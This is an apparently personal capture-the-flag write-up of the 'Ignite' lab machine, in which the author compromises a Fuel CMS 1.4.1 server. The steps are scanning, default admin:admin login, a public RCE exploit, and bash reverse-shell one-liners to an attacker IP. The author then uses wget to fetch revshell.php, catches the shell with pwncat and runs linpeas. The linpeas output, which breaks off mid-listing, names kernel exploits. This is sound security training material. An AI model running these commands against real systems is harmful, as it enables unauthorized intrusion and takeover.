# Ignite

Laurent Chauvin | November 01, 2022

## Resources

[1] https://cve.circl.lu/cve/CVE-2018-16763

[2] https://github.com/daylightstudio/FUEL-CMS/commit/6c72834a0d8d3bc34604b9ae0dbb6eef32c0070e

## Progress

```
export IP=10.10.118.198
```

Nmap scan
```
nmap -sC -sV -oN nmap/initial $IP

Starting Nmap 7.92 ( https://nmap.org ) at 2022-11-01 14:28 EDT
Nmap scan report for 10.10.118.198
Host is up (0.11s latency).
Not shown: 999 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
| http-robots.txt: 1 disallowed entry 
|_/fuel/
|_http-title: Welcome to FUEL CMS

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 25.30 seconds
```

Gobuster scan
```
gobuster dir -u $IP -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt | tee gobuster.log 

===============================================================
Gobuster v3.2.0-dev
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.118.198
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.2.0-dev
[+] Timeout:                 10s
===============================================================
2022/11/01 14:29:55 Starting gobuster in directory enumeration mode
===============================================================
/index                (Status: 200) [Size: 16597]
/home                 (Status: 200) [Size: 16597]
/0                    (Status: 200) [Size: 16597]
/assets               (Status: 301) [Size: 315] [--> http://10.10.118.198/assets/]
/'                    (Status: 400) [Size: 1134]
/$FILE                (Status: 400) [Size: 1134]
/$file                (Status: 400) [Size: 1134]
/offline              (Status: 200) [Size: 70]
/*checkout*           (Status: 400) [Size: 1134]
/*docroot*            (Status: 400) [Size: 1134]
/*                    (Status: 400) [Size: 1134]
/$File                (Status: 400) [Size: 1134]
/!ut                  (Status: 400) [Size: 1134]
/search!default       (Status: 400) [Size: 1134]
/msgReader$1          (Status: 400) [Size: 1134]
```

Nikto scan
```
nikto -h "http://$IP" | tee nikto.log 

- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.10.118.198
+ Target Hostname:    10.10.118.198
+ Target Port:        80
+ Start Time:         2022-11-01 14:30:23 (GMT-4)
---------------------------------------------------------------------------
+ Server: Apache/2.4.18 (Ubuntu)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
```

Visiting website indicates the use of Fuel CMS 1.4

In robots.txt:
```
User-agent: *
Disallow: /fuel/
```

Going to 'http://10.10.118.198/fuel/' send us to a login page.

Login with 'admin:admin' seems to work.

In 'Pages' can upload documents. Let's try to upload a reverse shell.

```
There was an error uploading your file. Please make sure the server is setup to upload files of this size and folders are writable.
```

Try to upload in assets.

Cannot upload php files. Tried .phtml, .php.png, zip it and select unzip option.
```
The filetype you are attempting to upload is not allowed.
```

Try to create a new page instead.

```
Data saved.

There is an updated view file located at /var/www/html/fuel/application/views/home.php. Would you like to upload it into the body of your page (if available)?
```

Look for exploits
```
searchsploit Fuel                        
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                                            |  Path
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
AMD Fuel Service - 'Fuel.service' Unquote Service Path                                                                                                                                                    | windows/local/49535.txt
Franklin Fueling Systems Colibri Controller Module 1.8.19.8580 - Local File Inclusion (LFI)                                                                                                               | linux/remote/50861.txt
Franklin Fueling TS-550 evo 2.0.0.6833 - Multiple Vulnerabilities                                                                                                                                         | hardware/webapps/31180.txt
fuel CMS 1.4.1 - Remote Code Execution (1)                                                                                                                                                                | linux/webapps/47138.py
Fuel CMS 1.4.1 - Remote Code Execution (2)                                                                                                                                                                | php/webapps/49487.rb
Fuel CMS 1.4.1 - Remote Code Execution (3)                                                                                                                                                                | php/webapps/50477.py
Fuel CMS 1.4.13 - 'col' Blind SQL Injection (Authenticated)                                                                                                                                               | php/webapps/50523.txt
Fuel CMS 1.4.7 - 'col' SQL Injection (Authenticated)                                                                                                                                                      | php/webapps/48741.txt
Fuel CMS 1.4.8 - 'fuel_replace_id' SQL Injection (Authenticated)                                                                                                                                          | php/webapps/48778.txt
Fuel CMS 1.5.0 - Cross-Site Request Forgery (CSRF)                                                                                                                                                        | php/webapps/50884.txt
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

Trying fuel CMS 1.4.1 - Remote Code Execution (1). After modifications for Python3 compatibility, got
```
python3 47138.py
cmd:ls

systemREADME.md
assets
composer.json
contributing.md
fuel
index.php
robots.txt

<div style="border:1px solid #990000;padding-left:20px;margin:0 0 10px 0;">

<h4>A PHP Error was encountered</h4>

<p>Severity: Warning</p>
<p>Message:  preg_match(): Delimiter must not be alphanumeric or backslash</p>
<p>Filename: controllers/Pages.php(924) : runtime-created function</p>
<p>Line Number: 1</p>


        <p>Backtrace:</p>








                        <p style="margin-left:10px">
                        File: /var/www/html/fuel/modules/fuel/controllers/Pages.php(924) : runtime-created function<br />
                        Line: 1<br />
                        Function: preg_match                    </p>






                        <p style="margin-left:10px">
                        File: /var/www/html/fuel/modules/fuel/controllers/Pages.php<br />
                        Line: 932<br />
                        Function: array_filter                  </p>






                        <p style="margin-left:10px">
                        File: /var/www/html/index.php<br />
                        Line: 364<br />
                        Function: require_once                  </p>




</div>
cmd:system
<div style="border:1px solid #990000;padding-left:20px;margin:0 0 10px 0;">

<h4>A PHP Error was encountered</h4>

<p>Severity: Warning</p>
<p>Message:  system(): Cannot execute a blank command</p>
<p>Filename: controllers/Pages.php(924) : runtime-created function</p>
<p>Line Number: 1</p>


        <p>Backtrace:</p>








                        <p style="margin-left:10px">
                        File: /var/www/html/fuel/modules/fuel/controllers/Pages.php(924) : runtime-created function<br />
                        Line: 1<br />
                        Function: system                        </p>






                        <p style="margin-left:10px">
                        File: /var/www/html/fuel/modules/fuel/controllers/Pages.php<br />
                        Line: 932<br />
                        Function: array_filter                  </p>






                        <p style="margin-left:10px">
                        File: /var/www/html/index.php<br />
                        Line: 364<br />
                        Function: require_once                  </p>




</div>
<div style="border:1px solid #990000;padding-left:20px;margin:0 0 10px 0;">

<h4>A PHP Error was encountered</h4>

<p>Severity: Warning</p>
<p>Message:  preg_match(): Delimiter must not be alphanumeric or backslash</p>
<p>Filename: controllers/Pages.php(924) : runtime-created function</p>
<p>Line Number: 1</p>


        <p>Backtrace:</p>








                        <p style="margin-left:10px">
                        File: /var/www/html/fuel/modules/fuel/controllers/Pages.php(924) : runtime-created function<br />
                        Line: 1<br />
                        Function: preg_match                    </p>






                        <p style="margin-left:10px">
                        File: /var/www/html/fuel/modules/fuel/controllers/Pages.php<br />
                        Line: 932<br />
                        Function: array_filter                  </p>






                        <p style="margin-left:10px">
                        File: /var/www/html/index.php<br />
                        Line: 364<br />
                        Function: require_once                  </p>




</div>
```

Seems like we have code execution.

```
cmd:id
systemuid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Tried reverse shell but did not work
```
bash -i >& /dev/tcp/10.18.23.136/9999 0>&1
/bin/bash -l > /dev/tcp/10.18.23.136/9999 0<&1 2>&1
```

Let's check home directories


Let's check 'www-data' home directory
```
cmd:ls /home/www-data/

flag.txt
```

Let's try to display the flag
```
cmd:cat /home/www-data/flag.txt

6470e394cbf6dab6a91682cc8585059b 
```

Got it. Let's privesc.

Started a server on my end:
```
python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Now send the command to download revshell.php from our end:
```
python3 47138.py

cmd:wget http://10.18.23.136/revshell.php
```

Let's check our server
```
python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.18.23.136 - - [01/Nov/2022 15:37:41] "GET /revshell.php HTTP/1.1" 200 -
```

It worked.

Let's fire pwncat
```
cd /opt/pwncat
poetry shell
pwncat-cs -lp 9999
```

Let's fire our webshell by going to 'http://10.18.23.136/revshell.php'
```
pwncat-cs -lp 9999                               
[14:51:40] Welcome to pwncat 🐈!                                                                                                                                                                                             __main__.py:164
[15:37:55] received connection from 10.10.233.211:51154                                                                                                                                                                           bind.py:84
[15:37:57] 0.0.0.0:9999: upgrading from /bin/dash to /bin/bash                                                                                                                                                                manager.py:957
[15:37:58] 10.10.233.211:51154: registered new host w/ db                                                                                                                                                                     manager.py:957
(local) pwncat$
```

We have shell.

Let's run pwncat ```enumerate list``` to find privesc vector.

```
(local) pwncat$ escalate list
[15:42:04] warning: no direct escalations found          
```

Upload linpeas
```
upload /opt/linpeas.sh
```

Run linpeas
```
chmod +x linpeas.sh
./linpeas.sh
```

Output
```


                            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
                    ▄▄▄▄▄▄▄             ▄▄▄▄▄▄▄▄
             ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄
         ▄▄▄▄     ▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄
         ▄    ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄          ▄▄▄▄▄▄               ▄▄▄▄▄▄ ▄
         ▄▄▄▄▄▄              ▄▄▄▄▄▄▄▄                 ▄▄▄▄ 
         ▄▄                  ▄▄▄ ▄▄▄▄▄                  ▄▄▄
         ▄▄                ▄▄▄▄▄▄▄▄▄▄▄▄                  ▄▄
         ▄            ▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄   ▄▄
         ▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄                                ▄▄▄▄
         ▄▄▄▄▄  ▄▄▄▄▄                       ▄▄▄▄▄▄     ▄▄▄▄
         ▄▄▄▄   ▄▄▄▄▄                       ▄▄▄▄▄      ▄ ▄▄
         ▄▄▄▄▄  ▄▄▄▄▄        ▄▄▄▄▄▄▄        ▄▄▄▄▄     ▄▄▄▄▄
         ▄▄▄▄▄▄  ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄   ▄▄▄▄▄ 
          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄        ▄          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ 
         ▄▄▄▄▄▄▄▄▄▄▄▄▄                       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄                         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
          ▀▀▄▄▄   ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▀▀▀▀▀▀
               ▀▀▀▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▀▀
                     ▀▀▀▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▀▀▀

    /---------------------------------------------------------------------------------\
    |                             Do you like PEASS?                                  |                                                                                                                                                     
    |---------------------------------------------------------------------------------|                                                                                                                                                     
    |         Get the latest version    :     https://github.com/sponsors/carlospolop |                                                                                                                                                     
    |         Follow on Twitter         :     @carlospolopm                           |                                                                                                                                                     
    |         Respect on HTB            :     SirBroccoli                             |                                                                                                                                                     
    |---------------------------------------------------------------------------------|                                                                                                                                                     
    |                                 Thank you!                                      |                                                                                                                                                     
    \---------------------------------------------------------------------------------/                                                                                                                                                     
          linpeas-ng by carlospolop                                                                                                                                                                                                         
                                                                                                                                                                                                                                            
ADVISORY: This script should be used for authorized penetration testing and/or educational purposes only. Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own computers and/or with the computer owner's permission.                                                                                                                                                                                              
                                                                                                                                                                                                                                            
Linux Privesc Checklist: https://book.hacktricks.xyz/linux-hardening/linux-privilege-escalation-checklist
 LEGEND:                                                                                                                                                                                                                                    
  RED/YELLOW: 95% a PE vector
  RED: You should take a look to it
  LightCyan: Users with console
  Blue: Users without console & mounted devs
  Green: Common things (users, groups, SUID/SGID, mounts, .sh scripts, cronjobs) 
  LightMagenta: Your username

 Starting linpeas. Caching Writable Folders...

                               ╔═══════════════════╗
═══════════════════════════════╣ Basic information ╠═══════════════════════════════                                                                                                                                                         
                               ╚═══════════════════╝                                                                                                                                                                                        
OS: Linux version 4.15.0-45-generic (buildd@lcy01-amd64-027) (gcc version 5.4.0 20160609 (Ubuntu 5.4.0-6ubuntu1~16.04.10)) #48~16.04.1-Ubuntu SMP Tue Jan 29 18:03:48 UTC 2019
User & Groups: uid=33(www-data) gid=33(www-data) groups=33(www-data)
Hostname: ubuntu
Writable folder: /dev/shm
[+] /bin/ping is available for network discovery (linpeas can discover hosts, learn more with -h)
[+] /bin/bash is available for network discovery, port scanning and port forwarding (linpeas can discover hosts, scan ports, and forward ports. Learn more with -h)                                                                         
[+] /bin/nc is available for network discovery & port scanning (linpeas can discover hosts and scan ports, learn more with -h)                                                                                                              
                                                                                                                                                                                                                                            
                                                                                                                                                                                                                                            

Caching directories . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . uniq: write error: Broken pipe
DONE
                                                                                                                                                                                                                                            
                              ╔════════════════════╗
══════════════════════════════╣ System Information ╠══════════════════════════════                                                                                                                                                          
                              ╚════════════════════╝                                                                                                                                                                                        
╔══════════╣ Operative system
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#kernel-exploits                                                                                                                                                          
Linux version 4.15.0-45-generic (buildd@lcy01-amd64-027) (gcc version 5.4.0 20160609 (Ubuntu 5.4.0-6ubuntu1~16.04.10)) #48~16.04.1-Ubuntu SMP Tue Jan 29 18:03:48 UTC 2019                                                                  
Distributor ID: Ubuntu
Description:    Ubuntu 16.04.6 LTS
Release:        16.04
Codename:       xenial

╔══════════╣ Sudo version
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-version                                                                                                                                                             
Sudo version 1.8.16                                                                                                                                                                                                                         

╔══════════╣ CVEs Check
Vulnerable to CVE-2021-4034                                                                                                                                                                                                                 

Potentially Vulnerable to CVE-2022-2588


╔══════════╣ USBCreator
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation/d-bus-enumeration-and-command-injection-privilege-escalation                                                                                                             
Vulnerable!!                                                                                                                                                                                                                                

╔══════════╣ PATH
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-path-abuses                                                                                                                                                     
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin                                                                                                                                                                                
New path exported: /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

╔══════════╣ Date & uptime
Tue Nov  1 12:55:04 PDT 2022                                                                                                                                                                                                                
 12:55:04 up 20 min,  0 users,  load average: 2.43, 2.04, 1.33

╔══════════╣ Any sd*/disk* disk in /dev? (limit 20)
disk                                                                                                                                                                                                                                        

╔══════════╣ Unmounted file-system?
╚ Check if you can mount umounted devices                                                                                                                                                                                                   
UUID=5434ae4f-f356-4a52-b597-8b83e2139f33       /       ext4    errors=remount-ro       0 1                                                                                                                                                 
UUID=bd95fcc9-4fb8-401f-83bd-d81dd194b02c       none    swap    sw      0 0

╔══════════╣ Environment
╚ Any private information inside environment variables?                                                                                                                                                                                     
HISTFILESIZE=0                                                                                                                                                                                                                              
SHLVL=2
OLDPWD=/
PS1=$(command printf "\[\033[01;31m\](remote)\[\033[0m\] \[\033[01;33m\]$(whoami)@$(hostname)\[\033[0m\]:\[\033[1;36m\]$PWD\[\033[0m\]\$ ")
APACHE_RUN_DIR=/var/run/apache2
APACHE_PID_FILE=/var/run/apache2/apache2.pid
_=./linpeas.sh
TERM=xterm-256color
HISTCONTROL=ignorespace
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
APACHE_LOCK_DIR=/var/lock/apache2
LANG=C
HISTSIZE=0
APACHE_RUN_USER=www-data
APACHE_RUN_GROUP=www-data
APACHE_LOG_DIR=/var/log/apache2
PWD=/dev/shm
HISTFILE=/dev/null

╔══════════╣ Searching Signature verification failed in dmesg
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#dmesg-signature-verification-failed                                                                                                                                      
dmesg Not Found                                                                                                                                                                                                                             
                                                                                                                                                                                                                                            
╔══════════╣ Executing Linux Exploit Suggester
╚ https://github.com/mzet-/linux-exploit-suggester                                                                                                                                                                                          
cat: write error: Broken pipe                                                                                                                                                                                                               
cat: write error: Broken pipe
cat: write error: Broken pipe
cat: write error: Broken pipe
cat: write error: Broken pipe
cat: write error: Broken pipe
[+] [CVE-2021-4034] PwnKit

   Details: https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt
   Exposure: probable
   Tags: [ ubuntu=10|11|12|13|14|15|16|17|18|19|20|21 ],debian=7|8|9|10|11,fedora,manjaro
   Download URL: https://codeload.github.com/berdav/CVE-2021-4034/zip/main

[+] [CVE-2021-3156] sudo Baron Samedit 2

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: probable
   Tags: centos=6|7|8,[ ubuntu=14|16|17|18|19|20 ], debian=9|10
   Download URL: https://codeload.github.com/worawit/CVE-2021-3156/zip/main

[+] [CVE-2022-32250] nft_object UAF (NFT_MSG_NEWSET)

   Details: https://research.nccgroup.com/2022/09/01/settlers-of-netlink-exploiting-a-limited-uaf-in-nf_tables-cve-2022-32250/
https://blog.theori.io/research/CVE-2022-32250-linux-kernel-lpe-2022/
   Exposure: less probable
   Tags: ubuntu=(22.04){kernel:5.15.0-27-generic}
   Download URL: https://raw.githubusercontent.com/theori-io/CVE-2022-32250-exploit/main/exp.c
   Comments: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN)

[+] [CVE-2022-2586] nft_object UAF

   Details: https://www.openwall.com/lists/oss-security/2022/08/29/5
   Exposure: less probable
   Tags: ubuntu=(20.04){kernel:5.12.13}
   Download URL: https://www.openwall.com/lists/oss-security/2022/08/29/5/1
   Comments: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN)

[+] [CVE-2021-3156] sudo Baron Samedit

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: less probable
   Tags: mint=19,ubuntu=18|20, debian=10
   Download URL: https://codeload.github.com/blasty/CVE-2021-3156/zip/main

[+] [CVE-2021-22555] Netfilter heap out-of-bounds write

   Details: https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html
   Exposure: less probable
   Tags: ubuntu=20.04{kernel:5.8.0-*}
   Download URL: https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c
   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2021-22555/exploit.c
   Comments: ip_tables kernel module must be loaded

[+] [CVE-2019-18634] sudo pwfeedback

   Details: https://dylankatz.com/Analysis-of-CVE-2019-18634/
   Exposure: less probable
   Tags: mint=19
   Download URL: https://github.com/saleemrashid/sudo-cve-2019-18634/raw/master/exploit.c
   Comments: sudo configuration requires pwfeedback to be enabled.

[+] [CVE-2019-15666] XFRM_UAF

   Details: https://duasynt.com/blog/ubuntu-centos-redhat-privesc
   Exposure: less probable
   Download URL: 
   Comments: CONFIG_USER_NS needs to be enabled; CONFIG_XFRM needs to be enabled

[+] [CVE-2018-1000001] RationalLove

   Details: https://www.halfdog.net/Security/2017/LibcRealpathBufferUnderflow/
   Exposure: less probable
   Tags: debian=9{libc6:2.24-11+deb9u1},ubuntu=16.04.3{libc6:2.23-0ubuntu9}
   Download URL: https://www.halfdog.net/Security/2017/LibcRealpathBufferUnderflow/RationalLove.c
   Comments: kernel.unprivileged_userns_clone=1 required

[+] [CVE-2017-1000366,CVE-2017-1000379] linux_ldso_hwcap_64

   Details: https://www.qualys.com/2017/06/19/stack-clash/stack-clash.txt
   Exposure: less probable
   Tags: debian=7.7|8.5|9.0,ubuntu=14.04.2|16.04.2|17.04,fedora=22|25,centos=7.3.1611
   Download URL: https://www.qualys.com/2017/06/19/stack-clash/linux_ldso_hwcap_64.c
   Comments: Uses "Stack Clash" technique, works against most SUID-root binaries


╔══════════╣ Executing Linux Exploit Suggester 2
╚ https://github.com/jondonas/linux-exploit-suggester-2                                                                                                                                                                                     
                                                                                                                                                                                                                                            
╔══════════╣ Protections
═╣ AppArmor enabled? .............. You do not have enough privilege to read the profile set.                                                                                                                                               
apparmor module is loaded.
═╣ grsecurity present? ............ grsecurity Not Found
═╣ PaX bins present? .............. PaX Not Found                                                                                                                                                                                           
═╣ Execshield enabled? ............ Execshield Not Found                                                                                                                                                                                    
═╣ SELinux enabled? ............... sestatus Not Found                                                                                                                                                                                      
═╣ Seccomp enabled? ............... disabled                                                                                                                                                                                                
═╣ AppArmor profile? .............. unconfined
═╣ User namespace? ................ enabled
═╣ Cgroup2 enabled? ............... enabled
═╣ Is ASLR enabled? ............... Yes
═╣ Printer? ....................... No
═╣ Is this a virtual machine? ..... Yes (xen)                                                                                                                                                                                               

                                   ╔═══════════╗
═══════════════════════════════════╣ Container ╠═══════════════════════════════════                                                                                                                                                         
                                   ╚═══════════╝                                                                                                                                                                                            
╔══════════╣ Container related tools present
╔══════════╣ Am I Containered?                                                                                                                                                                                                              
╔══════════╣ Container details                                                                                                                                                                                                              
═╣ Is this a container? ........... No                                                                                                                                                                                                      
═╣ Any running containers? ........ No                                                                                                                                                                                                      
                                                                                                                                                                                                                                            

                                     ╔═══════╗
═════════════════════════════════════╣ Cloud ╠═════════════════════════════════════                                                                                                                                                         
                                     ╚═══════╝                                                                                                                                                                                              
═╣ Google Cloud Platform? ............... No
═╣ AWS ECS? ............................. No
═╣ AWS EC2? ............................. Yes
═╣ AWS Lambda? .......................... No

╔══════════╣ AWS EC2 Enumeration
ami-id: ami-0513a710922a8bbe9                                                                                                                                                                                                               
instance-action: none
instance-id: i-0ac2919f6bdc923b2
instance-life-cycle: on-demand
instance-type: t2.nano
region: eu-west-1

══╣ Account Info
{                                                                                                                                                                                                                                           
  "Code" : "Success",
  "LastUpdated" : "2022-11-01T19:33:13Z",
  "AccountId" : "739930428441"
}

══╣ Network Info
Mac: 02:3a:11:97:ad:55/                                                                                                                                                                                                                     
Owner ID: 739930428441
Public Hostname: 
Security Groups: AllowEverything
Private IPv4s:

Subnet IPv4: 10.10.0.0/16
PrivateIPv6s:

Subnet IPv6: 
Public IPv4s:



══╣ IAM Role
                                                                                                                                                                                                                                            

══╣ User Data
                                                                                                                                                                                                                                            

                ╔════════════════════════════════════════════════╗
════════════════╣ Processes, Crons, Timers, Services and Sockets ╠════════════════                                                                                                                                                          
                ╚════════════════════════════════════════════════╝                                                                                                                                                                          
╔══════════╣ Cleaned processes
╚ Check weird & unexpected proceses run by root: https://book.hacktricks.xyz/linux-hardening/privilege-escalation#processes                                                                                                                 
root         1  1.6  0.7 119668  3456 ?        Ss   12:34   0:21 /sbin/init auto noprompt                                                                                                                                                   
root       219  0.0  0.1  27796   980 ?        Ss   12:34   0:01 /lib/systemd/systemd-journald
root       248  0.1  0.0  45296   360 ?        Ss   12:34   0:02 /lib/systemd/systemd-udevd
systemd+   314  0.0  0.0 102384   472 ?        Ssl  12:34   0:00 /lib/systemd/systemd-timesyncd
  └─(Caps) 0x0000000002000000=cap_sys_time
avahi      644  0.0  0.0  44784    56 ?        S    12:35   0:00  _ avahi-daemon: chroot helper
root       633  0.0  0.0   4396     0 ?        Ss   12:35   0:00 /usr/sbin/acpid
root       634  0.0  0.0  36076   436 ?        Ss   12:35   0:00 /usr/sbin/cron -f
root       636  0.0  0.1  28620   640 ?        Ss   12:35   0:00 /lib/systemd/systemd-logind
message+   643  0.1  0.4  43608  2328 ?        Ss   12:35   0:02 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation
  └─(Caps) 0x0000000020000000=cap_audit_write
root       671  0.0  0.0  16124     4 ?        Ss   12:35   0:00 /sbin/dhclient -1 -v -pf /run/dhclient.eth0.pid -lf /var/lib/dhcp/dhclient.eth0.leases -I -df /var/lib/dhcp/dhclient6.eth0.leases eth0
root       682  0.0  0.2 388868  1100 ?        Ssl  12:35   0:00 /usr/sbin/NetworkManager --no-daemon[0m
root       687  0.0  0.1 298348   960 ?        Ssl  12:35   0:00 /usr/lib/accountsservice/accounts-daemon[0m
syslog     688  0.0  0.0 256392   356 ?        Ssl  12:35   0:00 /usr/sbin/rsyslogd -n
root       704  0.0  0.8 279808  4100 ?        Ssl  12:35   0:00 /usr/lib/snapd/snapd
root       791  0.0  0.4 294240  2036 ?        Ssl  12:35   0:01 /usr/lib/policykit-1/polkitd --no-debug
root       802  0.0  0.1 292168   956 ?        Ssl  12:35   0:00 /usr/sbin/lightdm
root       848  0.2  3.8 337068 18848 tty7     Ssl+ 12:35   0:03  _ /usr/lib/xorg/Xorg -core :0 -seat seat0 -auth /var/run/lightdm/root/:0 -nolisten tcp vt7 -novtswitch
root      1011  0.0  0.2 226180  1180 ?        Sl   12:35   0:00  _ lightdm --session-child 16 19
lightdm   1022  0.0  0.0   4504    68 ?        Ss   12:35   0:00      _ /bin/sh /usr/lib/lightdm/lightdm-greeter-session /usr/sbin/unity-greeter
lightdm   1028  0.5  3.4 1026772 16892 ?       Sl   12:35   0:07          _ /usr/sbin/unity-greeter
root       828  0.0  0.0  22820   208 ttyS0    Ss+  12:35   0:00 /sbin/agetty --keep-baud 115200 38400 9600 ttyS0 vt220
root       829  0.0  0.0  23004    28 tty1     Ss+  12:35   0:00 /sbin/agetty --noclear tty1 linux
mysql      883  0.2  6.2 1107928 30916 ?       Ssl  12:35   0:02 /usr/sbin/mysqld
whoopsie   889  0.0  0.0 284652     0 ?        Ssl  12:35   0:00 /usr/bin/whoopsie -f
root       892  0.0  0.0   4504     0 ?        Ss   12:35   0:00 /bin/sh /usr/lib/apt/apt.systemd.daily update
root       921  0.0  0.1   4504   628 ?        S    12:35   0:00  _ /bin/sh /usr/lib/apt/apt.systemd.daily lock_is_held update
root      1629 64.7 18.6 168720 91580 ?        RN   12:43   8:01      _ /usr/bin/python3 /usr/bin/unattended-upgrade --download-only
root       954  0.0  2.8 334980 14196 ?        Ss   12:35   0:00 /usr/sbin/apache2 -k start
www-data   978  0.0  1.0 335228  5068 ?        S    12:35   0:00  _ /usr/sbin/apache2 -k start
www-data  1216  0.0  0.0   4504    72 ?        S    12:38   0:00  |   _ sh -c uname -a; w; id; /bin/sh -i
www-data  1220  0.0  0.1  18032   576 ?        S    12:38   0:00  |       _ /bin/bash
www-data  1240  0.0  0.1  19128   516 ?        S    12:38   0:00  |           _ /usr/bin/script -qc /bin/bash /dev/null
www-data  1241  0.0  0.0   4504    68 pts/8    Ss   12:38   0:00  |               _ sh -c /bin/bash
www-data  1242  0.0  0.3  18240  1488 pts/8    S    12:38   0:00  |                   _ /bin/bash
www-data  1666  0.1  0.4   5284  2428 pts/8    S+   12:44   0:01  |                       _ /bin/sh ./linpeas.sh
www-data  5032  0.0  0.1   5284   872 pts/8    S+   12:56   0:00  |                           _ /bin/sh ./linpeas.sh
www-data  5036  0.0  0.5  34560  2928 pts/8    R+   12:56   0:00  |                           |   _ ps fauxwww
www-data  5035  0.0  0.1   5284   872 pts/8    S+   12:56   0:00  |                           _ /bin/sh ./linpeas.sh
www-data  1434  0.0  0.9 335012  4692 ?        S    12:40   0:00  _ /usr/sbin/apache2 -k start
www-data  1435  0.0  0.9 335012  4692 ?        S    12:40   0:00  _ /usr/sbin/apache2 -k start
www-data  1436  0.0  0.9 335012  4692 ?        S    12:40   0:00  _ /usr/sbin/apache2 -k start
www-data  1437  0.0  0.9 335012  4692 ?        S    12:40   0:00  _ /usr/sbin/apache2 -k start
www-data  1438  0.0  0.9 335012  4692 ?        S    12:40   0:00  _ /usr/sbin/apache2 -k start
lightdm   1014  0.0  0.1  45280   704 ?        Ss   12:35   0:00 /lib/systemd/systemd --user
lightdm   1015  0.0  0.2  63284   996 ?        S    12:35   0:00  _ (sd-pam)
lightdm   1027  0.0  0.2  42996  1076 ?        Ss   12:35   0:00 /usr/bin/dbus-daemon --fork --print-pid 5 --print-address 7 --session
lightdm   1050  0.0  0.2 353660  1240 ?        Sl   12:35   0:00 /usr/lib/at-spi2-core/at-spi-bus-launcher --launch-immediately
lightdm   1062  0.0  0.1  42764   544 ?        S    12:35   0:00  _ /usr/bin/dbus-daemon --config-file=/etc/at-spi2/accessibility.conf --nofork --print-address 3
lightdm   1054  0.0  0.2 281484  1100 ?        Sl   12:35   0:00 /usr/lib/gvfs/gvfsd
